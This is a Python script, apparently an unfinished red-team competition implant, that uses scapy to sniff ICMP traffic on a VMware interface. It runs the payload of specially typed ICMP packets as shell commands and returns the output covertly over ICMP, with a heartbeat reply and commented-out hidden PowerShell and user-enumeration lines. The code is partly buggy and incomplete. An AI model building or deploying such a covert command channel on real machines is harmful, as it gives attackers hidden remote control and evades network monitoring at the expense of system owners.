from scapy.all import *
import subprocess as sp
import threading
import sys
import socket
import random

"""This is the only way I can thing to pass a file name from one if to aother
There might be a better way to accomplish this but this is the only way I can come up with at the current moment
"""

def cmd_mon(pkt):
    typ = str(pkt.getlayer(ICMP).type)
    code = str(pkt.getlayer(ICMP).code)
    source = pkt.getlayer(IP).src
    dest = pkt.getlayer(IP).dst
    cmd_proc(pkt, typ, code, source,dest)

    
def cmd_proc(pkt, typ, code, source,dest):
    ip = "192.168.232.1"
    #ip=socket.gethostbyname(socket.gethostname())  
    print(typ, code, source,dest)
    if ip == dest:
        if typ >= "44" and typ <= "94":
            if code == "0":
                instruct = pkt.getlayer(ICMP).load.decode()
                result = sp.check_output(instruct, shell=True)
                print(result.decode())
                try:
                    if result.check_returncode() is None:
                        cmdout = result.stdout.decode()
                        #cmdout = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
                        print(cmdout)
                        #if len(cmdout) >= 1500:
                        #    first, second = cmdout[:len(cmdout)//2], cmdout[len(cmdout)//2:]
                        #    send_output(first, source, typ, 1)
                        #    send_output(second, source, typ, 1)
                        #else:
                        send_output(cmdout, source, typ, 1)
                except sp.CalledProcessError:
                    send_output("Error, Invalid Command", source, typ, 2)
        elif typ == "146":
            heart(source, 146)

def breakup(data):
    broken = []
   

def send_output(output, sender,protype,protcode):
    send(IP(dst=sender)/ICMP(type=int(protype), code=int(protcode))/output)


""" May have to be from the server due to the fact that ping will be blocked in a competition on the inbound traffic 
Or just checking to see if a response is recieved. IDK honestly. Gotta spend time drawing this out 
"""
def heart(dest, protype):
    send(IP(dst=dest)/ICMP(type=protype, code=1)/"abcdefghijklmnopqrstuvwxyzhi")

def sniffer():
    sniff(iface="VMware Virtual Ethernet Adapter for VMnet8", filter="icmp", prn=cmd_mon)

#def main():
    #print("Loaded Rick")
    #t1 = threading.Thread(target=heart)
    #t2 = threading.Thread(target=sniffer)
    #t2.start()
    #t2.join()

#cmd_proc("ep Get-LocalUser -Name Guest")
#sp.run("powershell -windowstyle hidden -", capture_output=True)

sniffer()